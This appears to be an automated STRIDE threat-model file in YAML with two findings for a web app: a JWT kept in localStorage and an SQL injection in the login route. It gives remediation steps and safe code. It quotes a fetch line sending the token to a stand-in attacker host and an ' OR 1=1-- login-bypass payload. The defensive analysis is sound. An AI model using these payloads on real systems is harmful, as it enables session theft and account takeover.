threats:
- local_id: frontend-spa-006
  threat_category_id: TH-04
  additional_categories: []
  stride: Information Disclosure
  cwe: CWE-922
  title: Insecure Storage of Sensitive Information — last-login-ip.component.ts:34
  affected_parameter: token (localStorage key)
  scenario: The JWT authentication token is stored in `localStorage` (`localStorage.setItem('token', authentication.token)`
    at `oauth.component.ts:51`; read at `last-login-ip.component.ts:34`, `app.guard.ts:18`, `hacking-instructor/helpers/helpers.ts:173`).
    `localStorage` is readable by any JavaScript executing on the same origin. Given that this SPA has multiple confirmed
    XSS sinks (stored XSS via feedback comments, lastLoginIp, DOM XSS in hacking instructor), a successful XSS payload can
    exfiltrate the JWT with `fetch('//attacker.com/?t='+localStorage.token)` — granting the attacker a fully authenticated
    session. The SPA also lacks a Content Security Policy, meaning exfiltration has no origin restriction.
  evidence_summary: The JWT is written to `localStorage` and read from it across at least 4 components; no `HttpOnly` cookie
    or BFF pattern prevents JavaScript access.
  impact_description: Any XSS in the SPA results in full session token theft, enabling persistent account takeover without
    user interaction after the XSS is triggered.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: None — no Content Security Policy, no HttpOnly cookie for token, no BFF pattern.
  mitigation_title: Store JWT in HttpOnly SameSite=Strict cookie via BFF pattern instead of localStorage
  remediation:
    effort: High
    steps:
    - 'Implement a Backend-for-Frontend (BFF) session endpoint: after login, the Express backend sets `Set-Cookie: token=<JWT>;
      HttpOnly; Secure; SameSite=Strict` and the SPA never receives the token directly.'
    - Remove all `localStorage.setItem('token', ...)` and `localStorage.getItem('token')` calls from the frontend.
    - 'Add a `Content-Security-Policy` header via Express `helmet.contentSecurityPolicy({ directives: { scriptSrc: ["''self''"]
      } })` to limit XSS exfiltration paths.'
    - Remove `localStorage.getItem('token')` from route guards; guards should instead call an authenticated `/api/me` endpoint
      to verify session state.
    code_example: "// Express: set HttpOnly cookie after auth\nres.cookie('token', jwt, {\n  httpOnly: true,\n  secure: true,\n\
      \  sameSite: 'strict',\n  maxAge: 8 * 60 * 60 * 1000  // 8 hours\n});\n// Angular guard: check session via API, not\
      \ localStorage\nreturn this.http.get('/api/me').pipe(\n  map(() => true),\n  catchError(() => { this.router.navigate(['/login']);\
      \ return of(false); })\n);"
    reference: CWE-922
  evidence:
  - file: frontend/src/app/last-login-ip/last-login-ip.component.ts
    line: 34
  evidence_check: verified
  controls_absent_evidence: []
  prior_finding_ref: null
  architectural_violation: true
  component_name: Angular 20 SPA Frontend
  source: stride
  id: T-001
  component: frontend-spa
  mitigation_ids:
  - M-010
  _title_source: JWT Session Token Stored in XSS-Accessible localStorage frontend/src/app/last-l…
  vektor: internet-anon
- local_id: auth-001
  threat_category_id: TH-01
  additional_categories:
  - TH-07
  stride: Spoofing
  cwe: CWE-89
  title: SQL Injection in login query — routes/login.ts:34
  affected_parameter: email
  scenario: 'An unauthenticated attacker POSTs to /rest/user/login with a crafted email value such as `'' OR 1=1--`. The raw
    SQL query at routes/login.ts:34 concatenates req.body.email directly into the SELECT statement: `SELECT * FROM Users WHERE
    email = ''${req.body.email}''`. The injected payload short-circuits the WHERE clause, returning the first user row (typically
    admin). No rate limiting exists on this endpoint, so the attacker can probe injection payloads at arbitrary speed and
    authenticate as any user including administrator without knowing their password.'
  evidence_summary: Raw string interpolation of req.body.email into a Sequelize models.sequelize.query() call constructs a
    SQL statement with no parameter binding.
  impact_description: Attacker authenticates as any user including admin, receiving a signed 6-hour JWT granting full account
    access.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None — no input validation, no parameterised query, no rate limit on this endpoint.
  mitigation_title: Replace raw SQL login query with parameterised Sequelize findOne call
  remediation:
    effort: Low
    steps:
    - 'Replace models.sequelize.query() at routes/login.ts:34 with UserModel.findOne({ where: { email: req.body.email, password:
      security.hash(req.body.password), deletedAt: null } }) — Sequelize generates a parameterised query automatically.'
    - Add express-validator or zod schema validation on req.body.email (must be RFC 5321 email format) before the DB call.
    - Apply express-rate-limit at server.ts:594 on POST /rest/user/login (e.g. 10 attempts per 15 minutes per IP).
    code_example: "// routes/login.ts — safe replacement\nconst authenticatedUser = await UserModel.findOne({\n  where: {\n\
      \    email: req.body.email,\n    password: security.hash(req.body.password ?? ''),\n    deletedAt: null\n  }\n})"
    reference: CWE-89
  evidence:
  - file: routes/login.ts
    line: 34
  evidence_check: verified
  controls_absent_evidence: []
  prior_finding_ref: null
  architectural_violation: false
  component_name: Authentication & Session Surface
  source: stride
  merged_from:
  - auth
  - backend-api
  merged_strides:
  - Spoofing
  - Tampering
  id: T-002
  component: auth
  effective_severity: Critical
  breach_distance: 1
  chain_role: keystone
  compound_chain_ids:
